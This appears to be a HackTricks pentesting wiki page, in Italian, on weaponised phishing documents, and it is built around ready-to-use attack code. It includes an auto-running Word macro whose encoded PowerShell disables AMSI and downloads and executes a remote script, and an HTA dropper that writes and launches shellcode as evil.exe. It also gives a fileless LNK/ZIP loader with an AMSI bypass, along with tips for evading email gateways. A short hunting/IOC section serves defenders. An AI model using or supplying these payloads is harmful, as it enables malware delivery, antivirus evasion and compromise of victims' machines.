# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Documenti Office

Microsoft Word esegue una validazione dei dati del file prima di aprirlo. La validazione viene effettuata identificando la struttura dei dati, in conformità allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file analizzato non verrà aperto.

Di solito i file Word che contengono macro usano l'estensione `.docm`. Tuttavia, è possibile rinominare il file cambiando l'estensione e mantenere comunque la capacità di eseguire le macro.\
Ad esempio, un file RTF non supporta le macro, per progettazione, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word ed sarà in grado di eseguire le macro.\
Gli stessi interni e meccanismi si applicano a tutto il software della Microsoft Office Suite (Excel, PowerPoint etc.).

Puoi usare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:
```bash
assoc | findstr /i "word excel powerp"
```
I file DOCX che fanno riferimento a un template remoto (File –Options –Add-ins –Manage: Templates –Go) che include macros possono a loro volta “eseguire” macros.

### Caricamento immagine esterna

Vai a: _Insert --> Quick Parts --> Field_\
_**Categorie**: Links and References, **Nomi campo**: includePicture, e **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Backdoor tramite macros

È possibile usare macros per eseguire codice arbitrario dal documento.

#### Funzioni di autoload

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di codice per macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Rimuovi manualmente i metadati

Vai su **File > Info > Inspect Document > Inspect Document**, che aprirà il Document Inspector. Clicca **Inspect** e poi **Remove All** accanto a **Document Properties and Personal Information**.

#### Doc Extension

Al termine, seleziona il menu a tendina **Save as type**, cambia il formato da **`.docx`** a **Word 97-2003 `.doc`**.\
Fai così perché **non puoi salvare macro all'interno di un `.docx`** e c'è un **pregiudizio** **nei confronti** dell'estensione abilitata alle macro **`.docm`** (es. l'icona di anteprima ha un enorme `!` e alcuni gateway web/email le bloccano completamente). Pertanto, questa **vecchia estensione `.doc` è il miglior compromesso**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente ed esegue come un'applicazione "completamente attendibile", senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito usando **`mshta.exe`**, che di solito è **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Quindi, se è stato disinstallato, gli HTA non potranno essere eseguiti.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzare l'autenticazione NTLM

Ci sono diversi modi per **forzare l'autenticazione NTLM "da remoto"**, per esempio, puoi aggiungere **immagini invisibili** nelle email o in HTML a cui l'utente accederà (anche tramite HTTP MitM?). Oppure inviare alla vittima l'**indirizzo di file** che **attiveranno** un'**autenticazione** semplicemente aprendo la cartella.

**Consulta queste idee e altre nelle pagine seguenti:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi solo rubare l'hash o l'autenticazione, puoi anche eseguire **NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campagne estremamente efficaci recapitano uno ZIP che contiene due documenti esca legittimi (PDF/DOCX) e un .lnk maligno. Il trucco è che il loader PowerShell vero e proprio è memorizzato nei byte grezzi dello ZIP dopo un marker univoco, e il .lnk lo estrae ed esegue interamente in memoria.

Flusso tipico implementato dal one-liner PowerShell del .lnk:

1) Individuare lo ZIP originale in percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e la cartella superiore della directory di lavoro corrente.
2) Leggere i byte dello ZIP e trovare un marker hardcoded (es., xFIQCV). Tutto ciò che segue il marker è il payload PowerShell incorporato.
3) Copiare lo ZIP in %ProgramData%, estrarlo lì e aprire il .docx esca per risultare legittimo.
4) Bypassare AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deoffuscare la fase successiva (es., rimuovere tutti i caratteri #) ed eseguirla in memoria.

Esempio di scheletro PowerShell per estrarre e eseguire la fase incorporata:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Note
- La delivery spesso abusa di sotto-domini PaaS reputati (es., *.herokuapp.com) e può limitare i payload (servendo ZIP benigni in base a IP/UA).
- La fase successiva spesso decodifica shellcode base64/XOR ed esegue il codice tramite Reflection.Emit + VirtualAlloc per minimizzare gli artefatti su disco.

Persistence used in the same chain
- COM TypeLib hijacking del Microsoft Web Browser control in modo che IE/Explorer o qualsiasi app che lo incorpora rilanci automaticamente il payload. Vedi dettagli e comandi pronti all'uso qui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- File ZIP contenenti la stringa marker ASCII (es., xFIQCV) appesa ai dati dell'archivio.
- .lnk che enumera cartelle parent/utente per individuare lo ZIP e apre un documento esca.
- Manomissione di AMSI tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread di lunga durata legati a processi business che terminano con link ospitati su domini PaaS di fiducia.

## File Windows da cui rubare hash NTLM

Consulta la pagina su **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Riferimenti

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
